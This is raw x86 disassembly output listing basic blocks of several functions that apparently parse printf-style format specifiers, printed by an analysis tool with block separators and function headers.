0xb0626c9:	mov	eax, dword ptr [ebx + 0x376c]
0xb0626cf:	and	byte ptr [esi + 0xc], 0xf8
0xb0626d3:	mov	word ptr [esi + 0xe], cx
0xb0626d7:	test	eax, eax
0xb0626d9:	jne	0xb062a55
None
|
|
|
v
0xb062811:	mov	dword ptr [esi + 0x18], eax
0xb062814:	add	esp, 0x1c
0xb062817:	mov	eax, edi
0xb062819:	pop	ebx
0xb06281a:	pop	esi
0xb06281b:	pop	edi
0xb06281c:	pop	ebp
0xb06281d:	ret	
None
|
|
|
v
0xb062604:	add	ebx, 0x1489fc
0xb06260a:	lea	edi, dword ptr [ebp + 1]
0xb06260d:	mov	dword ptr [esp + 0x30], edi
0xb062611:	movzx	eax, byte ptr [esi + 0xd]
0xb062615:	mov	edx, edi
0xb062617:	and	byte ptr [esi + 0xc], 7
0xb06261b:	mov	dword ptr [esi + 0x24], 0xffffffff
0xb062622:	and	eax, 0xfffffff2
0xb062625:	mov	dword ptr [esi + 0x10], 0x20
0xb06262c:	mov	byte ptr [esi + 0xd], al
0xb06262f:	movzx	eax, byte ptr [ebp + 1]
0xb062633:	movzx	ecx, al
0xb062636:	sub	ecx, 0x30
0xb062639:	cmp	ecx, 9
0xb06263c:	jbe	0xb062820
None
|
|
|
v
0xb062b50:	mov	dword ptr [esi + 0x28], 4
0xb062b57:	mov	eax, 0x53
0xb062b5c:	jmp	0xb0627e8
None
|
|
|
v
0xb06296b:	mov	edx, dword ptr [esp + 0x30]
0xb06296f:	xor	edi, edi
0xb062971:	jmp	0xb0626ad
None
|
|
|
v
0xb06269f:	sub	eax, 0x30
0xb0626a2:	xor	edi, edi
0xb0626a4:	cmp	eax, 9
0xb0626a7:	jbe	0xb0628b8
None
|
|
|
v
0xb062b61:	mov	edx, dword ptr [ebx + 0xec8]
0xb062b67:	mov	eax, dword ptr [edx + eax*4]
0xb062b6a:	test	eax, eax
0xb062b6c:	je	0xb06278f
None
|
|
|
v
0xb062a17:	mov	edx, dword ptr [esp + 0x30]
0xb062a1b:	cmp	byte ptr [edx], 0x24
0xb062a1e:	je	0xb062a30
None
|
|
|
v
0xb06293b:	lea	ecx, dword ptr [eax - 1]
0xb06293e:	mov	dword ptr [esi + 0x20], ecx
0xb062941:	mov	ecx, dword ptr [esp + 0x3c]
0xb062945:	mov	ecx, dword ptr [ecx]
0xb062947:	cmp	eax, ecx
0xb062949:	cmovb	eax, ecx
0xb06294c:	mov	ecx, dword ptr [esp + 0x3c]
0xb062950:	mov	dword ptr [ecx], eax
0xb062952:	add	edx, 1
0xb062955:	mov	dword ptr [esp + 0x30], edx
0xb062959:	lea	esi, dword ptr [esi]
0xb062960:	mov	eax, dword ptr [esi + 0x20]
0xb062963:	test	eax, eax
0xb062965:	js	0xb062897
None
|
|
|
v
0xb0628c1:	cmp	eax, 0xff
0xb0628c4:	je	0xb0628c9
None
|
|
|
v
0xb062642:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb062a30:	cmp	eax, 0xff
0xb062a33:	je	0xb062a4c
None
|
|
|
v
0xb062b3b:	mov	dword ptr [esi + 0x28], 0
0xb062b42:	jmp	0xb0627e8
None
|
|
|
v
0xb062a88:	sub	eax, 1
0xb062a8b:	mov	dword ptr [esi + 0x18], eax
0xb062a8e:	mov	dword ptr [esi + 0x14], eax
0xb062a91:	add	esp, 0x1c
0xb062a94:	mov	eax, edi
0xb062a96:	pop	ebx
0xb062a97:	pop	esi
0xb062a98:	pop	edi
0xb062a99:	pop	ebp
0xb062a9a:	ret	
None
|
|
|
v
0xb062820:	lea	eax, dword ptr [esp + 0x30]
0xb062824:	call	0xb062590
None
|
|
|
v
0xb062abe:	cmp	eax, 0x78
0xb062ac1:	je	0xb062ae6
None
|
|
|
v
0xb06264f:	movzx	eax, al
0xb062652:	mov	eax, dword ptr [ebx + eax*4 - 0x4f678]
0xb062659:	add	eax, ebx
0xb06265b:	jmp	eax
None
|
|
|
v
0xb062988:	cmp	eax, 0xff
0xb06298b:	je	0xb06298f
None
|
|
|
v
0xb0629ea:	movzx	eax, byte ptr [ecx + 1]
0xb0629ee:	jmp	0xb062648
None
|
|
|
v
0xb062c1a:	jle	0xb062acf
None
|
|
|
v
0xb062b1d:	mov	dword ptr [esi + 0x28], 0x400
0xb062b24:	jmp	0xb0627e8
None
|
|
|
v
0xb062929:	test	eax, eax
0xb06292b:	je	0xb062960
None
|
|
|
v
0xb062a0a:	lea	eax, dword ptr [esp + 0x30]
0xb062a0e:	call	0xb062590
None
|
|
|
v
0xb06283a:	mov	dword ptr [esp + 0x30], edi
0xb06283e:	mov	edx, edi
0xb062840:	movzx	eax, byte ptr [ebp + 1]
0xb062844:	jmp	0xb062648
None
|
|
|
v
0xb0629c7:	lea	edx, dword ptr [ecx + 1]
0xb0629ca:	cmp	eax, 0xff
0xb0629cd:	mov	dword ptr [esp + 0x30], edx
0xb0629d1:	je	0xb0629ea
None
|
|
|
v
0xb062c29:	mov	dword ptr [esi + 0x28], 0x800
0xb062c30:	mov	eax, 0x6e
0xb062c35:	jmp	0xb0627e8
None
|
|
|
v
0xb0625f0:	push	ebp
0xb0625f1:	push	edi
0xb0625f2:	push	esi
0xb0625f3:	push	ebx
0xb0625f4:	sub	esp, 0x1c
0xb0625f7:	mov	ebp, dword ptr [esp + 0x30]
0xb0625fb:	mov	esi, dword ptr [esp + 0x38]
0xb0625ff:	call	0xb1267db
None
|
|
|
v
0xb062ae6:	movzx	edx, byte ptr [esi + 0xc]
0xb062aea:	test	dl, 1
0xb062aed:	je	0xb062b07
None
|
|
|
v
0xb0627d6:	mov	dword ptr [esi + 0x28], 1
0xb0627dd:	mov	eax, 0x63
0xb0627e2:	lea	esi, dword ptr [esi]
0xb0627e8:	cmp	dword ptr [esi + 0x24], -1
0xb0627ec:	je	0xb062aa0
None
|
|
|
v
0xb062b98:	mov	eax, dword ptr [esi + 8]
0xb062b9b:	jmp	0xb0627e8
None
|
|
|
v
0xb0627f2:	test	eax, eax
0xb0627f4:	mov	eax, dword ptr [esp + 0x30]
0xb0627f8:	je	0xb062a88
None
|
|
|
v
0xb062bdc:	lea	esi, dword ptr [esi]
0xb062be0:	jg	0xb062ab9
None
|
|
|
v
0xb062b0c:	mov	dword ptr [esi + 0x28], 0x200
0xb062b13:	jmp	0xb0627e8
None
|
|
|
v
0xb0627e8:	cmp	dword ptr [esi + 0x24], -1
0xb0627ec:	je	0xb062aa0
None
|
|
|
v
0xb062960:	mov	eax, dword ptr [esi + 0x20]
0xb062963:	test	eax, eax
0xb062965:	js	0xb062897
None
|
|
|
v
0xb0627fe:	mov	dword ptr [esi + 0x14], eax
0xb062801:	mov	dword ptr [esp + 4], 0x25
0xb062809:	mov	dword ptr [esp], eax
0xb06280c:	call	0xb07ee30
None
|
|
|
v
0xb062ba0:	cmp	eax, 0x45
0xb062ba3:	jge	0xb062ad4
None
|
|
|
v
0xb06292d:	mov	edx, dword ptr [esp + 0x30]
0xb062931:	cmp	byte ptr [edx], 0x24
0xb062934:	jne	0xb062960
None
|
|
|
v
0xb062b47:	cmp	eax, 0x53
0xb062b4a:	jne	0xb062ac3
None
|
|
|
v
0xb062c00:	mov	dword ptr [esi + 0x28], 3
0xb062c07:	mov	eax, 0x73
0xb062c0c:	jmp	0xb0627e8
None
|
|
|
v
0xb062897:	mov	eax, dword ptr [esp + 0x34]
0xb06289b:	mov	edx, edi
0xb06289d:	mov	dword ptr [esp + 0x30], edi
0xb0628a1:	mov	edi, 1
0xb0628a6:	mov	dword ptr [esi + 0x20], eax
0xb0628a9:	add	eax, 1
0xb0628ac:	mov	dword ptr [esp + 0x34], eax
0xb0628b0:	jmp	0xb0626ad
None
|
|
|
v
0xb062ab9:	cmp	eax, 0x75
0xb062abc:	je	0xb062ae6
None
|
|
|
v
0xb062ad4:	test	byte ptr [esi + 0xc], 1
0xb062ad8:	je	0xb062afb
None
|
|
|
v
0xb0626f4:	movzx	eax, al
0xb0626f7:	mov	eax, dword ptr [ebx + eax*4 - 0x4f5d0]
0xb0626fe:	add	eax, ebx
0xb062700:	jmp	eax
None
|
|
|
v
0xb062a55:	movzx	ecx, byte ptr [edx]
0xb062a58:	mov	eax, dword ptr [eax + ecx*4]
0xb062a5b:	test	eax, eax
0xb062a5d:	je	0xb0626df
None
|
|
|
v
0xb062a35:	lea	ecx, dword ptr [eax - 1]
0xb062a38:	mov	dword ptr [esi + 0x1c], ecx
0xb062a3b:	mov	ecx, dword ptr [esp + 0x3c]
0xb062a3f:	mov	ecx, dword ptr [ecx]
0xb062a41:	cmp	eax, ecx
0xb062a43:	cmovb	eax, ecx
0xb062a46:	mov	ecx, dword ptr [esp + 0x3c]
0xb062a4a:	mov	dword ptr [ecx], eax
0xb062a4c:	add	edx, 1
0xb062a4f:	mov	dword ptr [esp + 0x30], edx
0xb062a53:	jmp	0xb062a20
None
|
|
|
v
0xb062a2b:	jmp	0xb0629ab
None
|
|
|
v
0xb062bd5:	jle	0xb062c11
None
|
|
|
v
0xb062aa0:	mov	edx, dword ptr [esi + 0x2c]
0xb062aa3:	test	edx, edx
0xb062aa5:	je	0xb0627f2
None
|
|
|
v
0xb06286f:	mov	dword ptr [esi], 0
0xb062875:	mov	edx, ecx
0xb062877:	jmp	0xb0626c3
None
|
|
|
v
0xb062acf:	cmp	eax, 0x67
0xb062ad2:	jg	0xb062ac3
None
|
|
|
v
0xb062a4c:	add	edx, 1
0xb062a4f:	mov	dword ptr [esp + 0x30], edx
0xb062a53:	jmp	0xb062a20
None
|
|
|
v
0xb062880:	lea	edi, dword ptr [edx + 1]
0xb062883:	mov	dword ptr [esp + 0x30], edi
0xb062887:	movzx	eax, byte ptr [edx + 1]
0xb06288b:	sub	eax, 0x30
0xb06288e:	cmp	eax, 9
0xb062891:	jbe	0xb062920
None
|
|
|
v
0xb06298f:	mov	edx, dword ptr [esp + 0x30]
0xb062993:	jmp	0xb0626c3
None
|
|
|
v
0xb062b8d:	test	eax, eax
0xb062b8f:	mov	dword ptr [esi + 0x2c], eax
0xb062b92:	js	0xb06278f
None
|
|
|
v
0xb062b29:	test	byte ptr [esi + 0xd], 2
0xb062b2d:	je	0xb062b3b
None
|
|
|
v
0xb062b2f:	mov	dword ptr [esi + 0x28], 1
0xb062b36:	jmp	0xb0627e8
None
|
|
|
v
0xb062a7f:	lea	eax, dword ptr [edx + 1]
0xb062a82:	jmp	0xb062771
None
|
|
|
v
0xb0627b1:	cmp	eax, 0x58
0xb0627b4:	je	0xb062ae6
None
|
|
|
v
0xb062b72:	lea	edx, dword ptr [esi + 0x30]
0xb062b75:	mov	dword ptr [esp + 0xc], edx
0xb062b79:	lea	edx, dword ptr [esi + 0x28]
0xb062b7c:	mov	dword ptr [esp + 8], edx
0xb062b80:	mov	dword ptr [esp + 4], 1
0xb062b88:	mov	dword ptr [esp], esi
0xb062b8b:	call	eax
None
|
|
|
v
0xb062a63:	lea	eax, dword ptr [esp + 0x30]
0xb062a67:	mov	dword ptr [esp + 4], esi
0xb062a6b:	mov	dword ptr [esp], eax
0xb062a6e:	call	0xb04c8b0
None
|
|
|
v
0xb062648:	sub	eax, 0x20
0xb06264b:	cmp	al, 0x29
0xb06264d:	ja	0xb062679
None
|
|
|
v
0xb0628c6:	mov	dword ptr [esi + 4], eax
0xb0628c9:	mov	edx, dword ptr [esp + 0x30]
0xb0628cd:	jmp	0xb0626ad
None
|
|
|
v
0xb062920:	lea	eax, dword ptr [esp + 0x30]
0xb062924:	call	0xb062590
None
|
|
|
v
0xb06278f:	mov	eax, dword ptr [esi + 8]
0xb062792:	mov	dword ptr [esi + 0x2c], 1
0xb062799:	cmp	eax, 0x64
0xb06279c:	je	0xb062ae6
None
|
|
|
v
0xb062850:	lea	ecx, dword ptr [edx + 1]
0xb062853:	mov	dword ptr [esp + 0x30], ecx
0xb062857:	movzx	eax, byte ptr [edx + 1]
0xb06285b:	cmp	al, 0x2a
0xb06285d:	je	0xb062998
None
|
|
|
v
0xb0626ad:	mov	dword ptr [esi + 0x1c], 0xffffffff
0xb0626b4:	mov	dword ptr [esi], 0xffffffff
0xb0626ba:	cmp	byte ptr [edx], 0x2e
0xb0626bd:	je	0xb062850
None
|
|
|
v
0xb0627c9:	cmp	eax, 0x63
0xb0627cc:	lea	esi, dword ptr [esi]
0xb0627d0:	jne	0xb062ac3
None
|
|
|
v
0xb062bd7:	cmp	eax, 0x73
0xb062bda:	je	0xb062c00
None
|
|
|
v
0xb06282d:	mov	ecx, dword ptr [esp + 0x30]
0xb062831:	cmp	byte ptr [ecx], 0x24
0xb062834:	je	0xb0629c7
None
|
|
|
v
0xb062952:	add	edx, 1
0xb062955:	mov	dword ptr [esp + 0x30], edx
0xb062959:	lea	esi, dword ptr [esi]
0xb062960:	mov	eax, dword ptr [esi + 0x20]
0xb062963:	test	eax, eax
0xb062965:	js	0xb062897
None
|
|
|
v
0xb062b18:	and	edx, 2
0xb062b1b:	je	0xb062b29
None
|
|
|
v
0xb062686:	mov	dword ptr [esi + 0x20], 0xffffffff
0xb06268d:	mov	dword ptr [esi + 4], 0
0xb062694:	movzx	eax, byte ptr [edx]
0xb062697:	cmp	al, 0x2a
0xb062699:	je	0xb062880
None
|
|
|
v
0xb062bbb:	mov	dword ptr [esi + 0x28], 2
0xb062bc2:	mov	eax, 0x43
0xb062bc7:	jmp	0xb0627e8
None
|
|
|
v
0xb062829:	test	eax, eax
0xb06282b:	je	0xb06283a
None
|
|
|
v
0xb0627ba:	jle	0xb062b47
None
|
|
|
v
0xb062bef:	mov	dword ptr [esi + 0x28], 5
0xb062bf6:	mov	eax, 0x70
0xb062bfb:	jmp	0xb0627e8
None
|
|
|
v
0xb0628b8:	lea	eax, dword ptr [esp + 0x30]
0xb0628bc:	call	0xb062590
None
|
|
|
v
0xb062998:	lea	ebp, dword ptr [edx + 2]
0xb06299b:	mov	dword ptr [esp + 0x30], ebp
0xb06299f:	movzx	eax, byte ptr [edx + 2]
0xb0629a3:	sub	eax, 0x30
0xb0629a6:	cmp	eax, 9
0xb0629a9:	jbe	0xb062a0a
None
|
|
|
v
0xb062863:	sub	eax, 0x30
0xb062866:	cmp	eax, 9
0xb062869:	jbe	0xb06297f
None
|
|
|
v
0xb062679:	test	byte ptr [esi + 0xc], 0x20
0xb06267d:	je	0xb062686
None
|
|
|
v
0xb062a20:	mov	eax, dword ptr [esi + 0x1c]
0xb062a23:	test	eax, eax
0xb062a25:	jns	0xb06298f
None
|
|
|
v
0xb062bb2:	cmp	eax, 0x43
0xb062bb5:	jne	0xb062ac3
None
|
|
|
v
0xb062bcc:	cmp	eax, 0x6f
0xb062bcf:	je	0xb062ae6
None
|
|
|
v
0xb062be6:	cmp	eax, 0x70
0xb062be9:	jne	0xb062ac3
None
|
|
|
v
0xb0627a2:	jg	0xb062bcc
None
|
|
|
v
0xb062c11:	cmp	eax, 0x69
0xb062c14:	je	0xb062ae6
None
|
|
|
v
0xb06297f:	lea	eax, dword ptr [esp + 0x30]
0xb062983:	call	0xb062590
None
|
|
|
v
0xb062c20:	cmp	eax, 0x6e
0xb062c23:	jne	0xb062ac3
None
|
|
|
v
0xb062b07:	test	dl, 4
0xb062b0a:	je	0xb062b18
None
|
|
|
v
0xb0629d3:	lea	edi, dword ptr [eax - 1]
0xb0629d6:	mov	dword ptr [esi + 0x24], edi
0xb0629d9:	mov	edi, dword ptr [esp + 0x3c]
0xb0629dd:	mov	edi, dword ptr [edi]
0xb0629df:	cmp	eax, edi
0xb0629e1:	cmovb	eax, edi
0xb0629e4:	mov	edi, dword ptr [esp + 0x3c]
0xb0629e8:	mov	dword ptr [edi], eax
0xb0629ea:	movzx	eax, byte ptr [ecx + 1]
0xb0629ee:	jmp	0xb062648
None
|
|
|
v
0xb062a73:	mov	edx, dword ptr [esp + 0x30]
0xb062a77:	test	eax, eax
0xb062a79:	jne	0xb0626df
None
|
|
|
v
0xb062ada:	mov	dword ptr [esi + 0x28], 0x107
0xb062ae1:	jmp	0xb0627e8
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b062c40
TOTAL BLOCKS :16
0xb062c62:	mov	edx, dword ptr [ebx - 0xf8]
0xb062c68:	lea	eax, dword ptr [ebp + 0x10]
0xb062c6b:	mov	dword ptr [ebp - 0x1c], eax
0xb062c6e:	test	edx, edx
0xb062c70:	je	0xb062ce8
None
|
|
|
v
0xb062ca5:	xor	edx, edx
0xb062ca7:	jmp	0xb062cb8
None
|
|
|
v
0xb062c87:	add	eax, 1
0xb062c8a:	lea	edx, dword ptr [eax*4 + 0x12]
0xb062c91:	and	edx, 0xfffffff0
0xb062c94:	sub	esp, edx
0xb062c96:	test	eax, eax
0xb062c98:	lea	edi, dword ptr [esp + 0x10]
0xb062c9c:	je	0xb062cc2
None
|
|
|
v
0xb062c7c:	mov	dword ptr [ebp - 0x20], esp
0xb062c7f:	mov	dword ptr [esp], esi
0xb062c82:	call	0xb07ae80
None
|
|
|
v
0xb062ce8:	mov	eax, dword ptr [ebp - 0x1c]
0xb062ceb:	mov	dword ptr [esp + 4], esi
0xb062cef:	mov	dword ptr [esp + 8], eax
0xb062cf3:	mov	eax, dword ptr [ebp + 8]
0xb062cf6:	mov	dword ptr [esp], eax
0xb062cf9:	call	0xb043810
None
|
|
|
v
0xb062cb0:	movsx	ecx, byte ptr [esi + edx]
0xb062cb4:	test	cl, cl
0xb062cb6:	js	0xb062d16
None
|
|
|
v
0xb062cfe:	lea	esp, dword ptr [ebp - 0xc]
0xb062d01:	pop	ebx
0xb062d02:	pop	esi
0xb062d03:	pop	edi
0xb062d04:	pop	ebp
0xb062d05:	ret	
None
|
|
|
v
0xb062d06:	mov	eax, dword ptr [ebx - 0x144]
0xb062d0c:	mov	eax, dword ptr [eax]
0xb062d0e:	mov	dword ptr [ebp + 8], eax
0xb062d11:	jmp	0xb062c62
None
|
|
|
v
0xb062c40:	push	ebp
0xb062c41:	mov	ebp, esp
0xb062c43:	push	edi
0xb062c44:	push	esi
0xb062c45:	push	ebx
0xb062c46:	sub	esp, 0x2c
0xb062c49:	mov	ecx, dword ptr [ebp + 8]
0xb062c4c:	call	0xb1267db
None
|
|
|
v
0xb062cc2:	mov	eax, dword ptr [ebp - 0x1c]
0xb062cc5:	mov	dword ptr [esp + 4], edi
0xb062cc9:	mov	dword ptr [esp + 8], eax
0xb062ccd:	mov	eax, dword ptr [ebp + 8]
0xb062cd0:	mov	dword ptr [esp], eax
0xb062cd3:	call	0xb056c60
None
|
|
|
v
0xb062cd8:	mov	esp, dword ptr [ebp - 0x20]
0xb062cdb:	lea	esp, dword ptr [ebp - 0xc]
0xb062cde:	pop	ebx
0xb062cdf:	pop	esi
0xb062ce0:	pop	edi
0xb062ce1:	pop	ebp
0xb062ce2:	ret	
None
|
|
|
v
0xb062d16:	lea	eax, dword ptr [ebx - 0x499fe]
0xb062d1c:	mov	dword ptr [esp + 0xc], eax
0xb062d20:	lea	eax, dword ptr [ebx - 0x49a23]
0xb062d26:	mov	dword ptr [esp + 4], eax
0xb062d2a:	lea	eax, dword ptr [ebx - 0x49a18]
0xb062d30:	mov	dword ptr [esp + 8], 0x2e
0xb062d38:	mov	dword ptr [esp], eax
0xb062d3b:	call	0xb027820
None
|
|
|
v
0xb062c9e:	movsx	ecx, byte ptr [esi]
0xb062ca1:	test	cl, cl
0xb062ca3:	js	0xb062d16
None
|
|
|
v
0xb062c51:	add	ebx, 0x1483af
0xb062c57:	mov	esi, dword ptr [ebp + 0xc]
0xb062c5a:	test	ecx, ecx
0xb062c5c:	je	0xb062d06
None
|
|
|
v
0xb062cb8:	mov	dword ptr [edi + edx*4], ecx
0xb062cbb:	add	edx, 1
0xb062cbe:	cmp	eax, edx
0xb062cc0:	jne	0xb062cb0
None
|
|
|
v
0xb062c72:	mov	eax, dword ptr [ebp + 8]
0xb062c75:	mov	eax, dword ptr [eax + 0x68]
0xb062c78:	test	eax, eax
0xb062c7a:	jle	0xb062ce8
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b062d40
TOTAL BLOCKS :8
0xb062d86:	mov	edx, 0xffffffff
0xb062d8b:	jmp	0xb062d6d
None
|
|
|
v
0xb062d6d:	add	ecx, 4
0xb062d70:	mov	edi, dword ptr [ecx]
0xb062d72:	lea	esi, dword ptr [edi - 0x30]
0xb062d75:	cmp	esi, 9
0xb062d78:	ja	0xb062d90
None
|
|
|
v
0xb062d40:	push	ebp
0xb062d41:	mov	ebp, 0x7fffffff
0xb062d46:	push	edi
0xb062d47:	push	esi
0xb062d48:	mov	ecx, dword ptr [eax]
0xb062d4a:	mov	esi, dword ptr [ecx]
0xb062d4c:	add	ecx, 4
0xb062d4f:	lea	edx, dword ptr [esi - 0x30]
0xb062d52:	jmp	0xb062d70
None
|
|
|
v
0xb062d90:	mov	dword ptr [eax], ecx
0xb062d92:	mov	eax, edx
0xb062d94:	pop	esi
0xb062d95:	pop	edi
0xb062d96:	pop	ebp
0xb062d97:	ret	
None
|
|
|
v
0xb062d7e:	cmp	edx, 0xccccccc
0xb062d84:	jle	0xb062d58
None
|
|
|
v
0xb062d58:	lea	edi, dword ptr [edx + edx*4]
0xb062d5b:	mov	edx, ebp
0xb062d5d:	sub	edx, esi
0xb062d5f:	add	edi, edi
0xb062d61:	add	esi, edi
0xb062d63:	cmp	edi, edx
0xb062d65:	mov	edx, 0xffffffff
0xb062d6a:	cmovle	edx, esi
0xb062d6d:	add	ecx, 4
0xb062d70:	mov	edi, dword ptr [ecx]
0xb062d72:	lea	esi, dword ptr [edi - 0x30]
0xb062d75:	cmp	esi, 9
0xb062d78:	ja	0xb062d90
None
|
|
|
v
0xb062d7a:	test	edx, edx
0xb062d7c:	js	0xb062d6d
None
|
|
|
v
0xb062d70:	mov	edi, dword ptr [ecx]
0xb062d72:	lea	esi, dword ptr [edi - 0x30]
0xb062d75:	cmp	esi, 9
0xb062d78:	ja	0xb062d90
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b062da0
TOTAL BLOCKS :71
0xb0631f8:	mov	edx, dword ptr [esp + 0x30]
0xb0631fc:	jmp	0xb062e7e
None
|
|
|
v
0xb06301e:	mov	dword ptr [esi + 4], eax
0xb063021:	mov	edx, dword ptr [esp + 0x30]
0xb063025:	jmp	0xb062e68
None
|
|
|
v
0xb06336d:	mov	edx, dword ptr [esp + 0x30]
0xb063371:	test	eax, eax
0xb063373:	jne	0xb062e9a
None
|
|
|
v
0xb062f9a:	mov	dword ptr [esp + 0x30], edi
0xb062f9e:	mov	eax, dword ptr [ebp + 4]
0xb062fa1:	mov	edx, edi
0xb062fa3:	jmp	0xb062df1
None
|
|
|
v
0xb062f8d:	mov	ecx, dword ptr [esp + 0x30]
0xb062f91:	cmp	dword ptr [ecx], 0x24
0xb062f94:	je	0xb06325a
None
|
|
|
v
0xb06327d:	mov	eax, dword ptr [ecx + 4]
0xb063280:	jmp	0xb062df1
None
|
|
|
v
0xb063010:	lea	eax, dword ptr [esp + 0x30]
0xb063014:	call	0xb062d40
None
|
|
|
v
0xb062e3a:	mov	dword ptr [esi + 0x10], 0x20
0xb062e41:	mov	dword ptr [esi + 0x20], 0xffffffff
0xb062e48:	mov	dword ptr [esi + 4], 0
0xb062e4f:	mov	eax, dword ptr [edx]
0xb062e51:	cmp	eax, 0x2a
0xb062e54:	je	0xb062fd8
None
|
|
|
v
0xb062f71:	mov	eax, dword ptr [ebx + ecx*4 - 0x4f3b0]
0xb062f78:	add	eax, ebx
0xb062f7a:	jmp	eax
None
|
|
|
v
0xb062fbb:	sub	eax, 0x30
0xb062fbe:	cmp	eax, 9
0xb062fc1:	jbe	0xb0631e8
None
|
|
|
v
0xb0632de:	lea	ecx, dword ptr [eax - 1]
0xb0632e1:	mov	dword ptr [esi + 0x1c], ecx
0xb0632e4:	mov	ecx, dword ptr [esp + 0x3c]
0xb0632e8:	mov	ecx, dword ptr [ecx]
0xb0632ea:	cmp	eax, ecx
0xb0632ec:	cmovb	eax, ecx
0xb0632ef:	mov	ecx, dword ptr [esp + 0x3c]
0xb0632f3:	mov	dword ptr [ecx], eax
0xb0632f5:	add	edx, 4
0xb0632f8:	mov	dword ptr [esp + 0x30], edx
0xb0632fc:	jmp	0xb0632b6
None
|
|
|
v
0xb062db4:	add	ebx, 0x14824c
0xb062dba:	lea	edi, dword ptr [ebp + 4]
0xb062dbd:	mov	dword ptr [esp + 0x30], edi
0xb062dc1:	movzx	eax, byte ptr [esi + 0xd]
0xb062dc5:	mov	edx, edi
0xb062dc7:	and	byte ptr [esi + 0xc], 7
0xb062dcb:	mov	dword ptr [esi + 0x24], 0xffffffff
0xb062dd2:	and	eax, 0xfffffff6
0xb062dd5:	or	eax, 4
0xb062dd8:	mov	byte ptr [esi + 0xd], al
0xb062ddb:	mov	eax, dword ptr [ebp + 4]
0xb062dde:	mov	dword ptr [esi + 0x10], 0x20
0xb062de5:	lea	ecx, dword ptr [eax - 0x30]
0xb062de8:	cmp	ecx, 9
0xb062deb:	jbe	0xb062f80
None
|
|
|
v
0xb062e7e:	and	byte ptr [esi + 0xd], 0xfd
0xb062e82:	xor	ebp, ebp
0xb062e84:	mov	eax, dword ptr [ebx + 0x376c]
0xb062e8a:	and	byte ptr [esi + 0xc], 0xf8
0xb062e8e:	mov	word ptr [esi + 0xe], bp
0xb062e92:	test	eax, eax
0xb062e94:	jne	0xb063350
None
|
|
|
v
0xb0630e0:	mov	eax, dword ptr [esi + 0x2c]
0xb0630e3:	test	eax, eax
0xb0630e5:	je	0xb0630a6
None
|
|
|
v
0xb063189:	test	eax, eax
0xb06318b:	je	0xb0631c0
None
|
|
|
v
0xb0632a0:	lea	eax, dword ptr [esp + 0x30]
0xb0632a4:	call	0xb062d40
None
|
|
|
v
0xb0632ad:	mov	edx, dword ptr [esp + 0x30]
0xb0632b1:	cmp	dword ptr [edx], 0x24
0xb0632b4:	je	0xb0632d9
None
|
|
|
v
0xb0631b2:	add	edx, 4
0xb0631b5:	mov	dword ptr [esp + 0x30], edx
0xb0631b9:	lea	esi, dword ptr [esi]
0xb0631c0:	mov	eax, dword ptr [esi + 0x20]
0xb0631c3:	test	eax, eax
0xb0631c5:	js	0xb062fee
None
|
|
|
v
0xb06335d:	lea	eax, dword ptr [esp + 0x30]
0xb063361:	mov	dword ptr [esp + 4], esi
0xb063365:	mov	dword ptr [esp], eax
0xb063368:	call	0xb04c9b0
None
|
|
|
v
0xb0631cb:	mov	edx, dword ptr [esp + 0x30]
0xb0631cf:	xor	edi, edi
0xb0631d1:	jmp	0xb062e68
None
|
|
|
v
0xb0631f1:	cmp	eax, 0xff
0xb0631f4:	je	0xb0631f8
None
|
|
|
v
0xb0630f8:	sub	eax, 4
0xb0630fb:	mov	dword ptr [esi + 0x18], eax
0xb0630fe:	mov	dword ptr [esi + 0x14], eax
0xb063101:	add	esp, 0x1c
0xb063104:	mov	eax, edi
0xb063106:	pop	ebx
0xb063107:	pop	esi
0xb063108:	pop	edi
0xb063109:	pop	ebp
0xb06310a:	ret	
None
|
|
|
v
0xb063218:	mov	eax, dword ptr [edx + 8]
0xb06321b:	lea	ebp, dword ptr [edx + 8]
0xb06321e:	mov	dword ptr [esp + 0x30], ebp
0xb063222:	sub	eax, 0x30
0xb063225:	cmp	eax, 9
0xb063228:	jbe	0xb0632a0
None
|
|
|
v
0xb062da0:	push	ebp
0xb062da1:	push	edi
0xb062da2:	push	esi
0xb062da3:	push	ebx
0xb062da4:	sub	esp, 0x1c
0xb062da7:	mov	ebp, dword ptr [esp + 0x30]
0xb062dab:	mov	esi, dword ptr [esp + 0x38]
0xb062daf:	call	0xb1267db
None
|
|
|
v
0xb062fc7:	mov	dword ptr [esi], 0
0xb062fcd:	mov	edx, ecx
0xb062fcf:	jmp	0xb062e7e
None
|
|
|
v
0xb0632d9:	cmp	eax, 0xff
0xb0632dc:	je	0xb0632f5
None
|
|
|
v
0xb062fa8:	mov	eax, dword ptr [edx + 4]
0xb062fab:	lea	ecx, dword ptr [edx + 4]
0xb062fae:	mov	dword ptr [esp + 0x30], ecx
0xb062fb2:	cmp	eax, 0x2a
0xb062fb5:	je	0xb063218
None
|
|
|
v
0xb063344:	jmp	0xb062f5e
None
|
|
|
v
0xb062f89:	test	eax, eax
0xb062f8b:	je	0xb062f9a
None
|
|
|
v
0xb0632b6:	mov	eax, dword ptr [esi + 0x1c]
0xb0632b9:	test	eax, eax
0xb0632bb:	jns	0xb0631f8
None
|
|
|
v
0xb0632a9:	test	eax, eax
0xb0632ab:	je	0xb0632b6
None
|
|
|
v
0xb063019:	cmp	eax, 0xff
0xb06301c:	je	0xb063021
None
|
|
|
v
0xb0631f6:	mov	dword ptr [esi], eax
0xb0631f8:	mov	edx, dword ptr [esp + 0x30]
0xb0631fc:	jmp	0xb062e7e
None
|
|
|
v
0xb0632f5:	add	edx, 4
0xb0632f8:	mov	dword ptr [esp + 0x30], edx
0xb0632fc:	jmp	0xb0632b6
None
|
|
|
v
0xb063350:	mov	ecx, dword ptr [edx]
0xb063352:	mov	ecx, dword ptr [eax + ecx*4]
0xb063355:	test	ecx, ecx
0xb063357:	je	0xb062e9a
None
|
|
|
v
0xb063379:	lea	eax, dword ptr [edx + 4]
0xb06337c:	mov	edx, dword ptr [edx]
0xb06337e:	jmp	0xb062f42
None
|
|
|
v
0xb062e9a:	mov	ebp, dword ptr [edx]
0xb062e9c:	lea	ecx, dword ptr [edx + 4]
0xb062e9f:	mov	dword ptr [esp + 0x30], ecx
0xb062ea3:	lea	eax, dword ptr [ebp - 0x4c]
0xb062ea6:	cmp	eax, 0x2e
0xb062ea9:	ja	0xb0631d8
None
|
|
|
v
